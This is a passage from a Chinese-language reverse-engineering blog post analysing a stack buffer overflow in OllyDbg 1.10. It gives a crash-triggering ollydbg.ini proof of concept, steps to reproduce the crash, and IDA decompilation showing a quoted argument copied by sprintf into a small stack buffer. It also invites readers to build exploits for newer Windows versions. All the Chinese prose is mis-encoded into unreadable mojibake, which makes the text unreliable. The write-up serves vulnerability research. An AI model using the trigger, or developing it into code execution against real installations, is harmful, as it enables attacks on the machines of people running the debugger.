class="line">Implib[17] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\mfcn42ud.Lib</span><br><span class="line">Implib[18] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MSVBVM50.lib</span><br><span class="line">Implib[19] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvbvm60.lib</span><br><span class="line">Implib[20] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcp60.lib</span><br><span class="line">Implib[21] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcp71.lib</span><br><span class="line">Implib[22] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcp80.lib</span><br><span class="line">Implib[23] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\MSVCR70.lib</span><br><span class="line">Implib[24] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcr71.lib</span><br><span class="line">Implib[25] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcr80.lib</span><br><span class="line">Implib[26] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\msvcrt.lib</span><br><span class="line">Implib[27] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\comctl32.lib</span><br><span class="line">Implib[28] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\dbgeng.lib</span><br><span class="line">Implib[29] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\dbghelp.lib</span><br><span class="line">Implib[30] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\kernel32.lib</span><br><span class="line">Implib[31] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\ntdll.lib</span><br><span class="line">Implib[32] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\oleaut32.lib</span><br><span class="line">Implib[33] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\oledlg.lib</span><br><span class="line">Implib[34] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\ollydbg.lib</span><br><span class="line">Implib[35] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\ws2_32.lib</span><br><span class="line">Implib[36] = C:\Users\lenovo\Desktop\ollydbg\ollydbg\LIB\wsock32.lib</span><br><span class="line">[Plugin ODbgScript]</span><br><span class="line">MRU1=</span><br><span class="line">MRU2=</span><br><span class="line">MRU3=</span><br><span class="line">MRU4=</span><br><span class="line">MRU5=</span><br><span class="line">Restore Script window=0</span><br><span class="line">Restore Script Log=0</span><br><span class="line">[å‚æ•°]</span><br><span class="line">Argument[0]=1</span><br><span class="line">[Plugin ä¸­æ–‡æœç´¢å¼•æ“]</span><br><span class="line">Restore UStrRef Window=0</span><br></pre></td></tr></table></figure></div>

<p>å…·ä½“æ“ä½œæ–¹æ³•ï¼š</p>
<ol>
<li>å°† poc å‘½åä¸º ollydbg.iniï¼Œæ”¾åœ¨ OD æ ¹ç›®å½•ä¸‹é¢(å…ˆå¤‡ä»½å¥½åŸå…ˆçš„æ–‡ä»¶)</li>
<li>ä¿®æ”¹ POC [History] ä¸‹é¢çš„ Executable[0] å‚æ•°ï¼Œå¡«å†™ä¸€ä¸ª exe æ–‡ä»¶è·¯å¾„</li>
<li>å¯åŠ¨åŸç‰ˆ OD(å¦‚æœä½ ä½¿ç”¨çš„æ˜¯å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆï¼Œè¯·æ‰“å¼€æ ¹ç›®å½•ä¸­çš„ OllyDBG.EXE)</li>
<li>é€‰æ‹© File ï¼Œç‚¹å‡»åˆšåˆšå¡«å†™çš„æ–‡ä»¶</li>
<li>ç‚¹å‡» Debug é€‰é¡¹å¡ä¸‹é¢çš„ Arguments é€‰é¡¹ï¼Œç‚¹å‡»é‚£ä¸²ä¹±ç çš„å‚æ•°ï¼Œç‚¹å‡»ç¡®å®š</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ODBUG-1.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ODBUG-2.png"
                     
                ></p>
<p>æ­¤æ—¶ OD å´©æºƒï¼ŒæˆåŠŸè§¦å‘äº†æ¼æ´ã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ ¹æ®è§†é¢‘ä¸­çš„æç¤ºï¼Œæˆ‘ä»¬ä½¿ç”¨ IDA æ‰“å¼€ OD ä¸»ç¨‹åºï¼Œæ¼æ´ä¸»è¦åœ¨ sub_44150C å‡½æ•°ä¸­ã€‚</p>
<p>åç¼–è¯‘ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">INT_PTR __stdcall <span class="title function_">sub_44150C</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// ebx@5</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v5; <span class="comment">// ebx@12</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// esi@12</span></span><br><span class="line">  CHAR *v7; <span class="comment">// edi@12</span></span><br><span class="line">  CHAR *v8; <span class="comment">// eax@14</span></span><br><span class="line">  CHAR *v9; <span class="comment">// edx@14</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// zf@15</span></span><br><span class="line">  CHAR v11; <span class="comment">// cl@17</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v12; <span class="comment">// ebx@25</span></span><br><span class="line">  CHAR *v13; <span class="comment">// edi@25</span></span><br><span class="line">  <span class="type">const</span> CHAR *v14; <span class="comment">// edx@30</span></span><br><span class="line">  INT_PTR result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">4096</span>]; <span class="comment">// [sp+0h] [bp-19204h]@28</span></span><br><span class="line">  <span class="type">const</span> CHAR *v17; <span class="comment">// [sp+FF0h] [bp-18214h]@26</span></span><br><span class="line">  CHAR ReturnedString[<span class="number">98304</span>]; <span class="comment">// [sp+1000h] [bp-18204h]@6</span></span><br><span class="line">  CHAR KeyName; <span class="comment">// [sp+19000h] [bp-204h]@6</span></span><br><span class="line">  CHAR String; <span class="comment">// [sp+19100h] [bp-104h]@23</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x110</span>u: <span class="comment">// WM_INITDIALOG</span></span><br><span class="line">      SendDlgItemMessageA(hDlg, <span class="number">4301</span>, <span class="number">0xC</span>u, <span class="number">0</span>, &amp;byte_4D5A7C);</span><br><span class="line">      SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0x155</span>u, <span class="number">1u</span>, <span class="number">0</span>);</span><br><span class="line">      SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0x141</span>u, <span class="number">0xFFF</span>u, <span class="number">0</span>);</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(&amp;KeyName, aArgumentI, v4);</span><br><span class="line">        GetPrivateProfileStringA(aArguments, &amp;KeyName, &amp;a08lx_4[<span class="number">5</span>], ReturnedString, <span class="number">0x1000</span>u, FileName);</span><br><span class="line">        <span class="keyword">if</span> ( ReturnedString[<span class="number">0</span>] )</span><br><span class="line">          SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0x143</span>u, <span class="number">0</span>, ReturnedString);<span class="comment">// get args from file then send them to textlist</span></span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v4 &lt; <span class="number">0x18</span> );</span><br><span class="line">      SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0xC</span>u, <span class="number">0</span>, &amp;byte_4D5D88);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x111</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( a3 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        SendDlgItemMessageA(hDlg, <span class="number">4302</span>, <span class="number">0xD</span>u, <span class="number">0x1000</span>u, &amp;byte_4D5D88);</span><br><span class="line">        <span class="keyword">if</span> ( byte_4D5D88 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">0</span>;</span><br><span class="line">          v6 = <span class="number">0</span>;</span><br><span class="line">          v7 = ReturnedString;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;KeyName, aArgumentI, v5);</span><br><span class="line">            GetPrivateProfileStringA(aArguments, &amp;KeyName, &amp;a08lx_4[<span class="number">5</span>], &amp;ReturnedString[<span class="number">4096</span> * v6], <span class="number">0x1000</span>u, FileName);</span><br><span class="line">            <span class="keyword">if</span> ( *v7 )</span><br><span class="line">            &#123;</span><br><span class="line">              v8 = &amp;ReturnedString[<span class="number">4096</span> * v6];</span><br><span class="line">              v9 = &amp;byte_4D5D88;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                v10 = *v8 == *v9;               <span class="comment">// cmp arg[0] and args[current].</span></span><br><span class="line">                <span class="keyword">if</span> ( *v8 != *v9 )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !*v8 )</span><br><span class="line">                  <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">                v11 = v8[<span class="number">1</span>];</span><br><span class="line">                v10 = v11 == v9[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> ( v11 != v9[<span class="number">1</span>] )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                v8 += <span class="number">2</span>;</span><br><span class="line">                v9 += <span class="number">2</span>;</span><br><span class="line">                v10 = v11 == <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v11 );</span><br><span class="line">              <span class="keyword">if</span> ( !v10 )</span><br><span class="line">              &#123;</span><br><span class="line">                ++v6;</span><br><span class="line">                v7 += <span class="number">4096</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">LABEL_21:</span><br><span class="line">            ++v5;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v5 &lt; <span class="number">0x18</span> );</span><br><span class="line">          <span class="keyword">if</span> ( byte_4D5D88 == <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;String, aS_9, &amp;byte_4D5D88);</span><br><span class="line">            WritePrivateProfileStringA(aArguments, aArgument0, &amp;String, FileName);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            WritePrivateProfileStringA(aArguments, aArgument0, &amp;byte_4D5D88, FileName);</span><br><span class="line">          &#125;</span><br><span class="line">          v12 = <span class="number">1</span>;</span><br><span class="line">          v13 = ReturnedString;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            v17 = v12;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;KeyName, aArgumentI, v12);</span><br><span class="line">            <span class="keyword">if</span> ( v6 &lt; v12 || *v13 != <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v17 = FileName;</span><br><span class="line">              <span class="keyword">if</span> ( v6 &lt; v12 )</span><br><span class="line">                v14 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v14 = &amp;v16[<span class="number">4096</span> * v12];</span><br><span class="line">              WritePrivateProfileStringA(aArguments, &amp;KeyName, v14, v17);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">sprintf</span>(&amp;String, aS_9, &amp;v16[<span class="number">4096</span> * v12]);<span class="comment">// overflow?</span></span><br><span class="line">              WritePrivateProfileStringA(aArguments, &amp;KeyName, &amp;String, FileName);</span><br><span class="line">            &#125;</span><br><span class="line">            ++v12;</span><br><span class="line">            v13 += <span class="number">4096</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v12 &lt; <span class="number">24</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        EndDialog(hDlg, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( a3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        EndDialog(hDlg, <span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x112</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( (a3 &amp; <span class="number">0xFFF0</span>) == <span class="number">0xF060</span> )</span><br><span class="line">        EndDialog(hDlg, <span class="number">-1</span>);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯¹å‡½æ•°æŸ¥çœ‹äº¤å‰å¼•ç”¨å‘ç°æœ‰å¦å¤–ä¸€ä¸ªå‡½æ•°è°ƒç”¨äº†æ­¤å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">INT_PTR <span class="title function_">sub_441858</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> DialogBoxParamA(hInstance, aDia_arguments, hWndClient, sub_44150C, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åŸæ¥å®ƒæ˜¯ä¸€ä¸ªå¯¹è¯æ¡†å›è°ƒå‡½æ•°ï¼Œç”¨äºå¤„ç†å¯¹è¯æ¡†çš„æ¶ˆæ¯ã€‚</p>
<p>æˆ‘ä»¬ä¸»è¦å…³æ³¨å­˜åœ¨æ¼æ´çš„ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            v17 = v12;</span><br><span class="line">            <span class="built_in">sprintf</span>(&amp;KeyName, aArgumentI, v12);</span><br><span class="line">            <span class="keyword">if</span> ( v6 &lt; v12 || *v13 != <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v17 = FileName;</span><br><span class="line">              <span class="keyword">if</span> ( v6 &lt; v12 )</span><br><span class="line">                v14 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                v14 = &amp;v16[<span class="number">4096</span> * v12];</span><br><span class="line">              WritePrivateProfileStringA(aArguments, &amp;KeyName, v14, v17);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">sprintf</span>(&amp;String, aS_9, &amp;v16[<span class="number">4096</span> * v12]);<span class="comment">// overflow?</span></span><br><span class="line">              WritePrivateProfileStringA(aArguments, &amp;KeyName, &amp;String, FileName);</span><br><span class="line">            &#125;</span><br><span class="line">            ++v12;</span><br><span class="line">            v13 += <span class="number">4096</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v12 &lt; <span class="number">24</span> );</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å¤„ä¼šä»ç¬¬äºŒä¸ªå‚æ•°å¼€å§‹éå†ï¼Œæœ€å¤–å±‚æ˜¯ do while å¾ªç¯ï¼Œå¾ªç¯ 24 æ¬¡å¤„ç†æ‰€æœ‰å‚æ•°ã€‚</p>
<p>ç¬¬ä¸€ä¸ª if å¤„ç†ä¸¤ç§æƒ…å†µ</p>
<ol>
<li>ini ä¸­çš„å‚æ•°æ²¡æœ‰å…¨éƒ¨å¤„ç†å®Œæ¯•ï¼Œå¹¶ä¸”å½“å‰å¤„ç†çš„å‚æ•°å¼€å¤´ä¸æ˜¯åŒå¼•å·</li>
<li>ini ä¸­çš„å‚æ•°å¤„ç†å®Œæ¯•</li>
</ol>
<p>ç¬¬ä¸€ç§æƒ…å†µï¼Œä¼šæ­£å¸¸çš„å–å¾—å‚æ•°åœ¨æ ˆä¸­çš„åœ°å€ï¼Œç„¶åé‡æ–°å†™å…¥ ini æ–‡ä»¶ã€‚ç¬¬äºŒç§æƒ…å†µæŠŠå‚æ•°åœ°å€è®¾ç½®æˆ 0ï¼Œè¿™æ ·å°±ä¸ä¼šæ›´æ–° ini æ–‡ä»¶äº†ã€‚</p>
<p>å› æ­¤ï¼Œå½“ ini æ–‡ä»¶æ²¡æœ‰å…¨éƒ¨å¤„ç†å®Œæ¯•ï¼Œå¹¶ä¸”å½“å‰å¤„ç†çš„å‚æ•°è¿˜æ˜¯ä»¥åŒå¼•å·å¼€å¤´çš„è¯ï¼Œç¨‹åºå°±ä¼šè·‘åˆ° else é‡Œé¢ï¼Œè¿™é‡Œçš„é€»è¾‘å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥å°†å‚æ•°ç”¨ sprintf å‡½æ•°æ‹·è´åˆ°å¦ä¸€ä¸ªæ ˆä¸­çš„ä½ç½®ï¼Œç„¶åå†æŠŠå®ƒæ›´æ–°åˆ° ini æ–‡ä»¶ä¸­ã€‚</p>
<p>ä¸ºä»€ä¹ˆè¦é’ˆå¯¹åŒå¼•å·æƒ…å†µå•ç‹¬å¤„ç†å‘¢ï¼Ÿç®€å•æŸ¥æ‰¾ä¸€ä¸‹ <strong>GetPrivateProfileString</strong> åœ¨ MSDN çš„å¸®åŠ©é¡µé¢å‘ç°å¦‚ä¸‹æè¿°</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">If the string associated with lpKeyName is enclosed in single or double quotation marks, the marks are discarded when the GetPrivateProfileString function retrieves the string.</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœç›®æ ‡å‚æ•°çš„å€¼è¢«å•å¼•å·æˆ–è€…åŒå¼•å·åŒ…è£¹ï¼Œé‚£ä¹ˆè¿™äº›åŒ…è£¹å­—ç¬¦å°†ä¼šè¢«è‡ªåŠ¨ä¸¢å¼ƒã€‚</p>
<p>æ‰€ä»¥æˆ‘çŒœæµ‹è¿™é‡Œä½œè€…é»˜è®¤ä»¥åŒå¼•å·å¼€å¤´çš„å‚æ•°ä¸ºç©ºå‚æ•°ï¼Œå³ â€œâ€ è¿™ç§å½¢æ€ï¼Œæ‰€ä»¥æ²¡æœ‰xxxxè¿›ä¸€æ­¥é™åˆ¶å‚æ•°é•¿åº¦ã€‚ä½†æ˜¯äº‹å®è¯æ˜ç”¨æˆ·å¯ä»¥é€šè¿‡ä¿®æ”¹ ini æ–‡ä»¶ä¼ å…¥ç•¸å½¢çš„å‚æ•°å³ â€œâ€xxxxâ€â€ è¿™æ ·å››ä¸ªåŒå¼•å·æ„æˆçš„å­—ç¬¦ä¸²ï¼Œæœ€å¤–å±‚çš„å¼•å·è¢« API è‡ªåŠ¨è¿‡æ»¤ï¼Œä½†æ˜¯å†…å±‚è¿˜å­˜åœ¨å¼•å·ï¼Œå¹¶ä¸”å‚æ•°ä¸ä¸ºç©ºï¼Œä¾ç„¶å¯ä»¥è¿›å…¥ sprinf é€»è¾‘ä¸­ã€‚</p>
<p><strong>IDA æŸ¥çœ‹ String å‚æ•°è·ç¦»æ ˆåº•åªæœ‰ 0x104 å­—èŠ‚ï¼Œä½†æ˜¯ç”¨æˆ·èƒ½å¤Ÿä¼ å…¥çš„å­—ç¬¦ä¸²æœ€å¤§å¯ä»¥è¾¾åˆ° 0x1000 å­—èŠ‚ï¼Œæ˜¾ç„¶ä¼šå¯¼è‡´æ ˆæº¢å‡ºã€‚</strong></p>
<p>è®ºå›ç»™å‡ºçš„ POC æ˜¯åœ¨ XP ä¸‹å¯ç”¨çš„ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è€ƒè™‘æ„å»ºä¸€ä¸‹ win7ã€win10 ç­‰ç³»ç»Ÿçš„ POCã€‚</p>
<p>è¦æ³¨æ„çš„æ˜¯æŸ¥çœ‹ç³»ç»Ÿæ˜¯å¦å¼€å¯ DEP æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼Œwin 7 ä¸‹é»˜è®¤åªä¸ºç³»ç»Ÿè¿›ç¨‹å’ŒæœåŠ¡å¼€å¯ï¼Œç¬¬ä¸‰æ–¹è¿›ç¨‹é»˜è®¤ä¸å¼€å¯ï¼Œå¯ä»¥é€šè¿‡ä»»åŠ¡ç®¡ç†å™¨è¿›è¡ŒæŸ¥çœ‹ã€‚</p>
<p>è™½ç„¶ç¬¬ä¸‰æ–¹ç¨‹åºä¸å¼€å¯ï¼Œä½†æ˜¯æ‰§è¡Œ shellcode çš„æ—¶å€™å¯èƒ½ä¼šè®¿é—®åˆ°å†…æ ¸çš„ä¸€äº›æ•°æ®ï¼Œæˆ–è€…æœ‰å…¶ä»–çš„æ“ä½œã€‚ä¸è¿‡æˆ‘å¯¹ windows æ¼æ´åˆ©ç”¨ä¸æ˜¯å¾ˆäº†è§£ï¼Œæš‚æ—¶æ²¡æœ‰å†™å‡ºå¯ç”¨çš„POCã€‚</p>
<p>æ­¤å¤–ï¼Œå¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆ OD ä¹Ÿæ˜¯å­˜åœ¨è¿™ä¸ªé—®é¢˜çš„ï¼Œåªè¦æ˜¯ OD ç‰ˆæœ¬ä¸º 1.10 åŸºæœ¬ä¸Šéƒ½ä¼šå—åˆ°å½±å“ï¼Œå…¶ä¸­ä¸­æ–‡ç‰ˆ POC å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[History]</span><br><span class="line">UDD path=C:\Users\lenovo\Desktop\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\UDD</span><br><span class="line">Plugin path=C:\Users\lenovo\Desktop\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\plugin</span><br><span class="line">View file=</span><br><span class="line">View text file=</span><br><span class="line">Object file=</span><br><span class="line">Import library=</span><br><span class="line">Log file=</span><br><span class="line">Run trace file=rtrace.txt</span><br><span class="line">API help file=</span><br><span class="line">Text save file=</span><br><span class="line">Symbolic data path=</span><br><span class="line">Executable[1]=C:\Users\lenovo\Desktop\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\OllyDBG.EXE</span><br><span class="line">Executable[2]=C:\Users\lenovo\Desktop\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\å¾çˆ±ç ´è§£ä¸“ç”¨ç‰ˆOllydbg\å¾çˆ±ç ´è§£[LCG].exe</span><br><span class="line">Executable[3]=C:\Users\lenovo\Desktop\1.exe</span><br><span class="line">Executable[4]=C:\Users\lenovo\Desktop\reverse2_final.exe</span><br><span class="line">Executable[5]=C:\Users\lenovo\Desktop\packed.exe</span><br><span class="line">Executable[0]=C:\Users\lenovo\Desktop\ollydbg\ollydbg\OllyDBG.EXE</span><br><span class="line">[Settings]</span><br><span class="line">Check DLL versions=0</span><br><span class="line">Show toolbar=1</span><br><span class="line">Status in toolbar=1</span><br><span class="line">Use hardware breakpoints to step=1</span><br><span class="line">Restore windows=2193</span><br><span class="line">Scroll MDI=0</span><br><span class="line">Horizontal scroll=0</span><br><span class="line">Topmost window=0</span><br><span class="line">Index of default font=1</span><br><span class="line">Index of default colours=0</span><br><span class="line">Index of default syntax highlighting=0</span><br><span class="line">Log buffer size index=0</span><br><span class="line">Run trace buffer size index=1</span><br><span class="line">Group adjacent commands in profile=1</span><br><span class="line">Highlighted trace register=-1</span><br><span class="line">IDEAL disassembling mode=0</span><br><span class="line">Disassemble in lowercase=1</span><br><span class="line">Separate arguments with TAB=0</span><br><span class="line">Extra space between arguments=0</span><br><span class="line">Show default segments=1</span><br><span class="line">NEAR jump modifiers=0</span><br><span class="line">Use short form of string commands=0</span><br><span class="line">Use RET instead of RETN=0</span><br><span class="line">Size sensitive mnemonics=1</span><br><span class="line">SSE size decoding mode=0</span><br><span class="line">Top of FPU stack=1</span><br><span class="line">Always show memory size=1</span><br><span class="line">Decode registers for any IP=1</span><br><span class="line">Show symbolic addresses=1</span><br><span class="line">Show local module names=1</span><br><span class="line">Gray data used as filling=1</span><br><span class="line">Show jump direction=1</span><br><span class="line">Show jump path=1</span><br><span class="line">Show jumpfrom path=1</span><br><span class="line">Show path if jump is not taken=1</span><br><span class="line">Underline fixups=1</span><br><span class="line">Center FOLLOWed command=1</span><br><span class="line">Show stack frames=1</span><br><span class="line">Show local names in stack=1</span><br><span class="line">Extended stack trace=1</span><br><span class="line">Synchronize source with CPU=1</span><br><span class="line">Include SFX extractor in code=0</span><br><span class="line">SFX trace mode=0</span><br><span class="line">Use real SFX entry from previous run=1</span><br><span class="line">Ignore SFX exceptions=1</span><br><span class="line">First pause=1</span><br><span class="line">Stop on new DLL=0</span><br><span class="line">Stop on DLL unload=0</span><br><span class="line">Stop on new thread=0</span><br><span class="line">Stop on thread end=0</span><br><span class="line">Stop on debug string=0</span><br><span class="line">Decode SSE registers=0</span><br><span class="line">Enable last error=1</span><br><span class="line">Ignore access violations in KERNEL32=1</span><br><span class="line">Ignore INT3=1</span><br><span class="line">Ignore TRAP=1</span><br><span class="line">Ignore access violations=1</span><br><span class="line">Step in unknown commands=1</span><br><span class="line">Ignore division by 0=1</span><br><span class="line">Ignore illegal instructions=1</span><br><span class="line">Ignore all FPU exceptions=1</span><br><span class="line">Warn when frequent breaks=0</span><br><span class="line">Warn when break not in code=0</span><br><span class="line">Autoreturn=0</span><br><span class="line">Save original command in trace=1</span><br><span class="line">Show traced ESP=1</span><br><span class="line">Show traced flags=1</span><br><span class="line">Animate over system DLLs=1</span><br><span class="line">Trace over string commands=0</span><br><span class="line">Synchronize CPU and Run trace=1</span><br><span class="line">Ignore custom exceptions=1</span><br><span class="line">Smart update=1</span><br><span class="line">Set high priority=1</span><br><span class="line">Append arguments=1</span><br><span class="line">Use ExitProcess=1</span><br><span class="line">Allow injection to get WinProc=0</span><br><span class="line">Sort WM_XXX by name=0</span><br><span class="line">Type of last WinProc breakpoint=0</span><br><span class="line">Snow-free drawing=0</span><br><span class="line">Demangle symbolic names=1</span><br><span class="line">Keep ordinal in name=1</span><br><span class="line">Only ASCII printable in dump=0</span><br><span class="line">Allow diacritical symbols=0</span><br><span class="line">String decoding=3</span><br><span class="line">Warn if not administrator=0</span><br><span class="line">Warn when terminating process=0</span><br><span class="line">Align dialogs=1</span><br><span class="line">Use font of calling window=0</span><br><span class="line">Specified dialog font=0</span><br><span class="line">Number of lines that follow EIP=0</span><br><span class="line">Restore window positions=1</span><br><span class="line">Restore width of columns=0</span><br><span class="line">Highlight sorted column=0</span><br><span class="line">Compress analysis data=1</span><br><span class="line">Backup UDD files=1</span><br><span class="line">Fill rest of command with NOPs=1</span><br><span class="line">Reference search mode=0</span><br><span class="line">Global search=1</span><br><span class="line">Aligned search=1</span><br><span class="line">Allow error margin=0</span><br><span class="line">Keep size of hex edit selection=1</span><br><span class="line">Modify tag of FPU register=1</span><br><span class="line">Hex inspector limits=1</span><br><span class="line">MMX display mode=0</span><br><span class="line">Last selected options card=5</span><br><span class="line">Last selected appearance card=3</span><br><span class="line">Ignore case in text search=1</span><br><span class="line">Letter key in Disassembler=1</span><br><span class="line">Looseness of code analysis=1</span><br><span class="line">Decode pascal strings=1</span><br><span class="line">Guess number of arguments=1</span><br><span class="line">Accept far calls and returns=1</span><br><span class="line">Accept direct segment modifications=1</span><br><span class="line">Decode VxD calls=1</span><br><span class="line">Accept privileged commands=1</span><br><span class="line">Accept I/O commands=1</span><br><span class="line">Accept NOPs=1</span><br><span class="line">Accept shifts out of range=1</span><br><span class="line">Accept superfluous prefixes=1</span><br><span class="line">Accept LOCK prefixes=1</span><br><span class="line">Accept unaligned stack operations=1</span><br><span class="line">Accept non-standard command forms=1</span><br><span class="line">Show ARG and LOCAL in procedures=1</span><br><span class="line">Save analysis to file=1</span><br><span class="line">Analyse main module automatically=1</span><br><span class="line">Analyse code structure=1</span><br><span class="line">Decode ifs as switches=1</span><br><span class="line">Save trace to file=0</span><br><span class="line">Trace contents of registers=1</span><br><span class="line">Functions preserve registers=0</span><br><span class="line">Decode tricks=1</span><br><span class="line">Automatically select register type=1</span><br><span class="line">Show decoded arguments=1</span><br><span class="line">Show decoded arguments in stack=1</span><br><span class="line">Show arguments in call stack=1</span><br><span class="line">Show induced calls=1</span><br><span class="line">Label display mode=0</span><br><span 